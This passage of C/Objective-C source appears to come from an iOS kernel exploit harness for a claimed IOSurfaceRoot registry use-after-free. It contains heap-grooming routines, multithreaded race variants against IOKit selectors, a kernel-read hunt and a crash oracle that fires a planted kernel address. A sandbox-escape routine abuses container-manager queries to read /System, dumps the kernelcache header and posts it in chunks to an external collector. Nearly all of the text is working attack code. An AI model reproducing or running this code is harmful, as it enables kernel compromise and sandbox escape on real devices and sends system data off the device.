        dropPort(wp);
        }
    }

    // --- (2) size sweep with the id marker in EVERY qword ---
    {
        IOSurfaceRef_ s = mkSurface();
        uint32_t sid = (s && &IOSurfaceGetID) ? IOSurfaceGetID(s) : 0;
        int sizes[] = {32, 48, 64};
        for (int si = 0; si < 3; si++) {
            @autoreleasepool {
            int sz = sizes[si], nq = sz / 8;
            uint64_t f[16];
            for (int q = 0; q < nq; q++) f[q] = sid ? (uint64_t)(sid + 1) : 0x21;
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(f, nq, sz);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            EV("[uaf][E7] sz=%d all-id dup=0x%x (%s)", sz, (uint32_t)rdup, rcName((uint32_t)rdup));
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        if (s) CFRelease(s);
    }

    // --- (3) refcnt-decrement probe: how many dereg until the code flips? ---
    for (int trial = 0; trial < 4; trial++) {
        @autoreleasepool {
        static const uint64_t f0v[4] = {1, 2, 3, 0x21};
        uint64_t f[6] = {f0v[trial], MARKER_ID, 0, 0, 0x4141414141414141ull, CANARY_F5};
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        groomRawFields(f, 6, 24);
        EV("[uaf][E7] refcnt-dec f0=%llu seq:", (unsigned long long)f0v[trial]);
        for (int k = 0; k < 6; k++) {
            kern_return_t rd = callSel(c, SEL_DEREG, in, 24, 0, wp);
            EV("[uaf][E7]   dereg#%d -> 0x%x (%s)", k + 1, (uint32_t)rd, rcName((uint32_t)rd));
            if (rd != KERN_SUCCESS && rd != (kern_return_t)0xE00002C9) break;
        }
        EV("[uaf][E7]   final dup=0x%x", (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp));
        freeGroom(); dropPort(wp); usleep(2000);
        }
    }

    // --- (4) control: zeroed groom vs content groom - identical dup? ---
    for (int variant = 0; variant < 2; variant++) {
        int hits = 0; uint32_t lastDup = 0;
        for (int i = 0; i < 5; i++) {
            @autoreleasepool {
            uint64_t z[6] = {0,0,0,0,0,CANARY_F5};
            uint64_t f2[6] = {0x21, MARKER_ID, MARKER_PTR, MARKER_VAL,
                              0x4141414141414141ull, CANARY_F5};
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            groomRawFields(variant ? f2 : z, 6, 24);
            kern_return_t rdup = callSel(c, SEL_REG, in, 24, shape, wp);
            if (rdup == KERN_SUCCESS) hits++;
            lastDup = (uint32_t)rdup;
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
        EV("[uaf][E7] ctrl variant=%s dup==0 hits=%d/5 lastDup=0x%x",
           variant ? "content" : "zero", hits, lastDup);
    }
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// KCE - kernelcache evidence.  The bad_query container-query escape (proven on
// THIS device: escape: live=36 read=8 [g=1 flag=0x800000000 part=0 depth=1])
// grants READ on /System.  The IOSurface kext is in the kernelcache; if we can
// pull its header now, the externalMethod table for selectors 17/18/1000 can be
// disassembled OFFLINE - the exact field-layout map the dynamic probes cannot
// reach.  We dump only the header + the first 32 KB (proven enough to locate
// the Mach-O/IM4P structure); the full pull is a follow-up module.
// ---------------------------------------------------------------------------
static int64_t sbxRead(const char *path) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    typedef void *(*qc)(void);
    typedef void (*qg)(void *, xpc_object_t);
    typedef void (*qp)(void *, uint64_t);
    typedef void (*qd)(void *, const char *);
    typedef void *(*qr)(void *);
    typedef void (*qf)(void *);
    typedef char *(*ct)(void *);
    typedef int64_t (*ce)(const char *);
    qc qcreate = (qc)dlsym(mgr, "container_query_create");
    qg qgids  = (qg)dlsym(mgr, "container_query_set_group_identifiers");
    qp qpart  = (qp)dlsym(mgr, "container_query_operation_set_part");
    qd qdom   = (qd)dlsym(mgr, "container_query_operation_set_part_domain");
    qr qres   = (qr)dlsym(mgr, "container_query_get_single_result");
    qf qfree  = (qf)dlsym(mgr, "container_query_free");
    ct ctoken = (ct)dlsym(mgr, "container_copy_sandbox_token");
    ce consume= (ce)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qcreate || !qgids || !qpart || !qdom || !qres || !qfree || !ctoken || !consume) {
        dlclose(mgr); return -2;
    }
    NSString *grp = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
    void *q = qcreate();
    if (!q) { dlclose(mgr); return -3; }
    qgids(q, xpc_string_create(grp.UTF8String));
    qpart(q, 0);
    char dom[512];
    snprintf(dom, sizeof dom, "%s%s", path[0] == '/' ? "../" : "", path);
    qdom(q, dom);
    void *result = qres(q);
    if (!result) { qfree(q); dlclose(mgr); return -4; }
    char *token = ctoken(result);
    if (!token) { qfree(q); dlclose(mgr); return -5; }
    int64_t h = consume(token);
    free(token); qfree(q); dlclose(mgr);
    return h;
}

static void stageKCE(void) {
    EV("[uaf][KCE] === stage KCE: kernelcache evidence via the sandbox escape ===");
    int64_t h = sbxRead("/System/Library/Caches");
    EV("[uaf][KCE] escape handle for /System/Library/Caches -> %lld", (long long)h);
    if (h <= 0) { EV("[uaf][KCE] escape failed (root-owned dir, or path moved on 26.2)"); return; }
    const char *dirs[] = { "/System/Library/Caches/com.apple.kernelcaches",
                           "/System/Library/Caches", NULL };
    for (int di = 0; dirs[di]; di++) {
        DIR *d = opendir(dirs[di]);
        if (!d) { EV("[uaf][KCE] opendir %s -> %s", dirs[di], strerror(errno)); continue; }
        struct dirent *de;
        while ((de = readdir(d))) {
            if (de->d_name[0] == '.') continue;
            EV("[uaf][KCE] entry: %s/%s", dirs[di], de->d_name);
        }
        closedir(d);
        if (di == 0) continue;
        // the kernelcache itself
        const char *kc = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
        struct stat st;
        if (stat(kc, &st) == 0) {
            EV("[uaf][KCE] kernelcache size=%lld", (long long)st.st_size);
            FILE *f = fopen(kc, "rb");
            if (f) {
                uint8_t buf[32768]; size_t n = fread(buf, 1, sizeof buf, f);
                fclose(f);
                EV("[uaf][KCE] header (first %zu bytes):", n);
                for (size_t o = 0; o + 16 <= n && o < 256; o += 16) {
                    char line[128]; size_t off = 0;
                    for (int k = 0; k < 16; k++)
                        off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
                    EV("[uaf][KCE]   +%#zx %s", o, line);
                }
                evLine("=== kernelcache header captured ===");
                // POST the header in chunks so the PC archive has it
                for (size_t o = 0; o + 1024 <= n; o += 1024) {
                    char chunk[1400]; size_t co = 0;
                    co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
                    for (size_t k = 0; k < 1024; k++)
                        co += (size_t)snprintf(chunk + co, sizeof chunk - co,
                                               "%02x", buf[o + k]);
                    AvePost([NSString stringWithUTF8String:chunk]);
                    usleep(5000);
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// ModIsurfUAF - the full harness
// ---------------------------------------------------------------------------
NSString *ModIsurfUAF(void) {
    evOpen();
    // if a previous run was killed mid-stage, say so first
    {
        struct stat st;
        if (g_evpath && stat(g_evpath, &st) == 0 && st.st_size > 0) {
            FILE *f = fopen(g_evpath, "r");
            if (f) {
                char buf[512]; fseek(f, -400, SEEK_END); size_t r = fread(buf, 1, sizeof buf - 1, f);
                buf[r] = 0; fclose(f);
                EV("[uaf][X] previous-run tail (crash marker): %s", buf);
            }
        }
    }
    AveSetStatus(@"112477: IOSurfaceRoot registry UAF");
    EV("[uaf] === CVE-2026-112477 IOSurfaceRoot registry UAF (mode 407) ===");

    if (findService() != 0) { if (g_ev) fclose(g_ev); g_ev = NULL;
        return @"112477: no IOSurface service"; }

    int shape = calibrate();
    if (shape < 0) { if (g_ev) fclose(g_ev); g_ev = NULL;
        return @"112477: sel17 async unavailable on this build"; }

    int okB = stageB(shape);
    if (okB < 100) EV("[uaf][B] WARNING: registry stub unstable (%d/120)", okB);

    // measurements first, panic-prone stuff last
    stageF(shape);
    stageE3(shape);
    stageE2(shape);
    stageE4(shape);
    stageE5(shape);
    stageE6(shape);
    stageE7(shape);
    stageG(shape);
    stageH(shape);

    if (okB >= 100) {
        // walk provocation over the race hunt
        gRenderRun = 1;
        pthread_t rth;
        pthread_create(&rth, NULL, renderLoop, NULL);
        EV("[uaf][C] phase 1: V_RACE8 x40");
        for (int i = 0; i < 40; i++) v_race8(shape, i);
        EV("[uaf][C] phase 2: V_BIG x30");
        for (int i = 0; i < 30; i++) v_big(shape, i);
        EV("[uaf][C] phase 3: V_SURFCH x40");
        for (int i = 0; i < 40; i++) v_surfch(shape, i);
        EV("[uaf][C] phase 4: V_DEREG18 x40");
        for (int i = 0; i < 40; i++) v_dereg18(shape, i);
        gRenderRun = 0; pthread_join(rth, NULL);
    } else {
        EV("[uaf][C] SKIP: registry stub unstable (%d/120)", okB);
    }

    // crash oracle LAST (all evidence already logged + on disk)
    if (okB >= 100) stageK(shape);

    // kernelcache evidence - offline force multiplier
    stageKCE();

    if (g_ev) fclose(g_ev); g_ev = NULL;

    if (g_read_echo)
        AveSetStatus(@"112477: KERNEL READ (controlled) - escalate");
    else if (g_read_out)
        AveSetStatus(@"112477: kernel read-shaped hit - inspect dump");
    else if (g_stale_seen)
        AveSetStatus(@"112477: stale-read only - G/H mapping needed");
    else
        AveSetStatus(@"112477: no stale read on 26.2b1");

    return S(@"112477: registry %d/120, stale-read=%d, read-shaped=%d, controlled=%d, "
              @"ptr-words=%d", okB, g_stale_seen, g_read_out, g_read_echo, g_ptr_words);
}

NSString *ModCVE86950(void);
NSString *ModShading5Force(void);
BOOL RootProbe(void);
static void stageK(int shape) {
    EV("[uaf][K] === stage K: deref canary (crash oracle) ===");
    EV("[uaf][K] writing crash-forensics file before firing");
    evLine("=== stage K begin ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][K] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    for (int slot = 0; slot < 3; slot++) {
        @autoreleasepool {
        uint64_t f[3] = {0x21, MARKER_ID, 0x4141414141410000ull};
        f[slot] = 0xfffffff007044000ull;      // canonical, unmapped kernel-range
        char note[256];
        snprintf(note, sizeof note,
                 "=== stage K: firing slot=%d val=%#016llx (expect panic iff deref) ===",
                 slot, (unsigned long long)f[slot]);
        evLine(note);
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        groomRawFields(f, 3, 24);
        // flush: let the POST land before the (possible) panic
        L2(@"[uaf][K] slot=%d armed val=%#llx - FIRING",
           slot, (unsigned long long)f[slot]);
        kern_return_t rdup  = callSel(c, SEL_REG,   in, 24, shape, wp);
        kern_return_t rdreg = callSel(c, SEL_DEREG, in, 24, 0,     wp);
        char aft[128];
        snprintf(aft, sizeof aft,
                 "=== stage K: slot=%d SURVIVED dup=0x%x dereg=0x%x ===",
                 slot, (uint32_t)rdup, (uint32_t)rdreg);
        evLine(aft);
        L2(@"[uaf][K] slot=%d survived dup=0x%x dereg=0x%x",
           slot, (uint32_t)rdup, (uint32_t)rdreg);
        if (rdup != (kern_return_t)0xE00002C9) g_stale_seen++;
        freeGroom(); dropPort(wp); usleep(3000);
        }
    }
    evLine("=== stage K complete: no deref observed ===");
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage D - walk provocation: a Metal render loop over IOSurfaces, which is
// the racing context the PoC's regression needs (registry churn + surface
// create/destroy at ~60fps).
// ---------------------------------------------------------------------------
static volatile int gRenderRun = 0;
static void *renderLoop(void *arg) {
    (void)arg;
    id dev = MTLCreateSystemDefaultDevice();
    if (!dev) { EV("[uaf][D] no MTL device"); return NULL; }
    EV("[uaf][D] MTL render loop started");
    int frames = 0;
    while (gRenderRun && frames < 200000) {
        IOSurfaceRef_ s = mkSurface();
        if (s) {
            CVPixelBufferRef pb = NULL;
            if (CVPixelBufferCreateWithIOSurface(NULL, (IOSurfaceRef)s, NULL, &pb))
                CFRelease(pb);
            CFRelease(s);
        }
        usleep(16000);
        frames++;
    }
    EV("[uaf][D] render loop done frames=%d", frames);
    return NULL;
}

// ---------------------------------------------------------------------------
// Stage C - seed hunt: the PoC's five race variants against the registry
// ---------------------------------------------------------------------------
static volatile int gSpamRun = 0;
static io_connect_t gSpamConn = 0;
static volatile int gSpamShape = 1;
static volatile uint64_t gSpamCount = 0;

static void *spamReg(void *arg) {
    (void)arg;
    io_connect_t c = gSpamConn; int shape = gSpamShape;
    mach_port_t wp = newWakePort();
    uint64_t in[3] = {1,2,3};
    while (gSpamRun) { callSel(c, SEL_REG, in, 24, shape, wp); gSpamCount++; }
    dropPort(wp); return NULL;
}
static void spawnSpam(pthread_t *th, int n, io_connect_t c, int shape) {
    gSpamRun = 1; gSpamConn = c; gSpamShape = shape; gSpamCount = 0;
    for (int i = 0; i < n; i++) pthread_create(&th[i], NULL, spamReg, NULL);
}
static void stopSpam(pthread_t *th, int n) {
    gSpamRun = 0;
    for (int i = 0; i < n; i++) pthread_join(th[i], NULL);
    EV("[uaf] spam count=%llu", (unsigned long long)gSpamCount);
}

static void v_race8(int shape, int iter) {
    io_connect_t cs[8]; int have[8]; uint64_t in[3] = {1,2,3};
    for (int i = 0; i < 8; i++) {
        have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
        if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
        else cs[i] = 0;
    }
    pthread_t th[16];
    spawnSpam(th, 16, have[0] ? cs[0] : 0, shape);
    for (int r = 0; r < 3; r++)
        for (int i = 0; i < 8; i++) {
            int j = (i * 5 + r * 3) % 8;
            if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
            usleep(20 + (iter % 10) * 7);
        }
    stopSpam(th, 16);
    for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
}

static void v_big(int shape, int iter) {
    IOSurfaceRef_ surf[64]; const int N = 64;
    for (int i = 0; i < N; i++) surf[i] = mkSurface();
    io_connect_t cs[8]; int have[8]; uint64_t in[3] = {1,2,3};
    for (int i = 0; i < 8; i++) {
        have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
        if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
        else cs[i] = 0;
    }
    pthread_t th[12];
    spawnSpam(th, 12, have[0] ? cs[0] : 0, shape);
    for (int i = 7; i >= 0; i--) { if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; } usleep(30); }
    for (int i = 0; i < N; i++) if (surf[i]) CFRelease(surf[i]);
    stopSpam(th, 12);
    for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
    (void)iter;
}

static void v_surfch(int shape, int iter) {
    io_connect_t c = 0; mach_port_t wp = newWakePort(); uint64_t in[3] = {1,2,3};
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
    callSel(c, SEL_REG, in, 24, shape, wp);
    pthread_t th[4];
    spawnSpam(th, 4, c, shape);
    for (int i = 0; i < 8; i++) {
        IOSurfaceRef_ s = mkSurface();
        if (s) CFRelease(s);
    }
    usleep(200 + (iter % 30) * 25);
    IOServiceClose(c);
    usleep(400); stopSpam(th, 4);
    dropPort(wp);
}

static void v_dereg18(int shape, int iter) {
    io_connect_t c = 0; mach_port_t wp = newWakePort(); uint64_t in[3] = {1,2,3};
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
    callSel(c, SEL_REG, in, 24, shape, wp);
    pthread_t th[4];
    spawnSpam(th, 4, c, shape);
    for (int i = 0; i < 40 + (iter % 20); i++)
        callSel(c, SEL_DEREG, in, 24, 0, wp);
    usleep(300); stopSpam(th, 4);
    IOServiceClose(c); dropPort(wp);
}
// ---------------------------------------------------------------------------
// Stage G - THE kernel READ hunt.  Every output shape the async dup might
// accept, on the stale entry (after groom) AND on a live entry as baseline,
// with correct SDK types.  A 0x0 with non-empty output = kernel READ.  Output
// carrying our markers = CONTROLLED read.  Pointer-like words = kernel heap
// leak, i.e. the fake-object primitive's missing half.
// ---------------------------------------------------------------------------
struct gshape { const char *name; int inSz; int structOut; int scalarOut; int sync; };
static const struct gshape GV[] = {
    {"async in24 no-out",       24,   0,  0, 0},   // the PoC's proved hit
    {"async in24 struct8",      24,   8,  0, 0},
    {"async in24 struct16",     24,  16,  0, 0},
    {"async in24 struct24",     24,  24,  0, 0},
    {"async in24 struct32",     24,  32,  0, 0},
    {"async in24 struct48",     24,  48,  0, 0},
    {"async in24 struct64",     24,  64,  0, 0},
    {"async in24 struct96",     24,  96,  0, 0},
    {"async in24 struct128",    24, 128,  0, 0},
    {"async in24 scalar1",      24,   0,  1, 0},
    {"async in24 scalar4",      24,   0,  4, 0},
    {"async in24 scalar16",     24,   0, 16, 0},
    {"async in24 scalar4+st64", 24,  64,  4, 0},
    {"async in8 struct64",       8,  64,  0, 0},
    {"async in16 struct64",     16,  64,  0, 0},
    {"async in0 struct64",       0,  64,  0, 0},
    {"sync  in24 no-out",       24,   0,  0, 1},
    {"sync  in24 struct64",     24,  64,  0, 1},
    {"sync  in24 scalar4",      24,   0,  4, 1},
    {"sync  in24 struct64+sc4", 24,  64,  4, 1},
};
static const int NGV = (int)(sizeof GV / sizeof GV[0]);

static void stageG(int shape) {
    EV("[uaf][G] === stage G: dup out-shape matrix - the kernel READ hunt ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][G] open fail"); return; }
    uint64_t in[3] = {1,2,3};
    for (int v = 0; v < NGV; v++) {
        const struct gshape *V = &GV[v];
        for (int iter = 0; iter < 2; iter++) {
            @autoreleasepool {
            mach_port_t wp = newWakePort();
            // stale + groom
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            uint64_t f[6] = {0x21, MARKER_ID, MARKER_PTR, MARKER_VAL,
                             0x4141414141414141ull, CANARY_F5};
            groomRawFields(f, 6, 24);
            uint8_t out[256]; memset(out, 0xCC, sizeof(out));
            size_t olen = (size_t)V->structOut;
            uint64_t sc[16]; uint32_t scn = (uint32_t)V->scalarOut;
            kern_return_t r;
            if (V->sync) r = callSyncFull(c, SEL_REG, in, (size_t)V->inSz,
                                          V->structOut ? out : NULL, &olen,
                                          V->scalarOut ? sc : NULL, &scn);
            else         r = callAsyncFull(c, SEL_REG, wp, in, (size_t)V->inSz,
                                          V->structOut ? out : NULL, &olen,
                                          V->scalarOut ? sc : NULL, &scn);
            int echoes = (r == KERN_SUCCESS && V->structOut) ? scanOut(V->name, out, olen) : 0;
            if (r == KERN_SUCCESS && (olen || scn)) {
                g_read_out++;
                EV("[uaf][G] %-22s STALE rc=0 olen=%zu scn=%u echoes=%d",
                   V->name, olen, scn, echoes);
                if (olen) dumpOut(V->name, out, olen);
                for (uint32_t i = 0; i < scn; i++)
                    EV("[uaf][G] %s scalar[%u]=%#016llx", V->name, i,
                       (unsigned long long)sc[i]);
                if (echoes) { g_read_echo += echoes;
                    EV("[uaf][G] %s CONTROLLED READ (%d marker echoes)", V->name, echoes); }
            } else {
                EV("[uaf][G] %-22s STALE rc=0x%x (%s) olen=%zu scn=%u",
                   V->name, (uint32_t)r, rcName((uint32_t)r), olen, scn);
            }
            if (r != (kern_return_t)0xE00002C9) g_stale_seen++;
            freeGroom();
            // live baseline with the same shape
            uint8_t out2[256]; memset(out2, 0xCC, sizeof(out2));
            size_t olen2 = (size_t)V->structOut;
            uint64_t sc2[16]; uint32_t sc2n = (uint32_t)V->scalarOut;
            kern_return_t r2;
            callSel(c, SEL_REG, in, 24, shape, wp);
            if (V->sync) r2 = callSyncFull(c, SEL_REG, in, (size_t)V->inSz,
                                          V->structOut ? out2 : NULL, &olen2,
                                          V->scalarOut ? sc2 : NULL, &sc2n);
            else         r2 = callAsyncFull(c, SEL_REG, wp, in, (size_t)V->inSz,
                                          V->structOut ? out2 : NULL, &olen2,
                                          V->scalarOut ? sc2 : NULL, &sc2n);
            EV("[uaf][G] %-22s LIVE  rc=0x%x (%s) olen=%zu scn=%u",
               V->name, (uint32_t)r2, rcName((uint32_t)r2), olen2, sc2n);
            if (r2 == KERN_SUCCESS && olen2) {
                int e2 = scanOut(V->name, out2, olen2);
                if (e2) { EV("[uaf][G] %s LIVE echoes=%d (entry echoes by default!)", V->name, e2); dumpOut(V->name, out2, olen2); }
            }
            dropPort(wp);
            usleep(1500);
            }
        }
    }
    EV("[uaf][G] done: read-shaped hits=%d controlled=%d ptr-words=%d",
       g_read_out, g_read_echo, g_ptr_words);
    IOServiceClose(c);
}

// ---------------------------------------------------------------------------
// Stage H - input-qword mapping: which input qword is the registry id, and
// which input sizes the shape check accepts.
// ---------------------------------------------------------------------------
static void stageH(int shape) {
    EV("[uaf][H] === stage H: input-qword mapping ===");
    io_connect_t c = 0;
    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { EV("[uaf][H] open fail"); return; }
    uint64_t vals[] = {1, 2, 3, 4, 7, 0x1122334455667788ull, CANARY_F5, 0x21, 0};
    int nv = (int)(sizeof vals / sizeof vals[0]);
    // which qword of the DUP call carries the id
    for (int q = 0; q < 3; q++) {
        for (int vi = 0; vi < nv; vi++) {
            @autoreleasepool {
            uint64_t in[3] = {1, 2, 3};
            in[q] = vals[vi];
            mach_port_t wp = newWakePort();
            callSel(c, SEL_REG, in, 24, shape, wp);
            callSel(c, SEL_DEREG, in, 24, 0, wp);
            uint64_t f[6] = {0x21, MARKER_ID, 0, 0, 0x4141414141414141ull, CANARY_F5};
            groomRawFields(f, 6, 24);
            kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
            if (r != (kern_return_t)0xE00002C9) {
                EV("[uaf][H] q%d=%#llx dup=0x%x (%s) <-- non-baseline",
                   q, (unsigned long long)vals[vi], (uint32_t)r, rcName((uint32_t)r));
                g_stale_seen++;
            } else {
                EV("[uaf][H] q%d=%#llx dup=0x%x", q, (unsigned long long)vals[vi], (uint32_t)r);
            }
            freeGroom(); dropPort(wp); usleep(2000);
            }
        }
    }
    // input size acceptance on the dup path
    int sizes[] = {0, 8, 16, 24, 32, 48};
    for (int si = 0; si < (int)(sizeof sizes / sizeof sizes[0]); si++) {
        @autoreleasepool {
        uint64_t in[3] = {1, 2, 3};
        mach_port_t wp = newWakePort();
        callSel(c, SEL_REG, in, 24, shape, wp);
        callSel(c, SEL_DEREG, in, 24, 0, wp);
        groomRawFields((uint64_t[]){0x21, MARKER_ID, 0, 0, 0x4141414141414141ull, CANARY_F5},
                       6, sizes[si] ? sizes[si] : 24);
        kern_return_t r = callSel(c, SEL_REG, in, (size_t)sizes[si], shape, wp);
        EV("[uaf][H] inSz=%d dup=0x%x (%s)", sizes[si], (uint32_t)r, rcName((uint32_t)r));
        if (r != (kern_return_t)0xE00002C9) g_stale_seen++;
        freeGroom(); dropPort(wp); usleep(2000);
        }
    }
    IOServiceClose(c);
}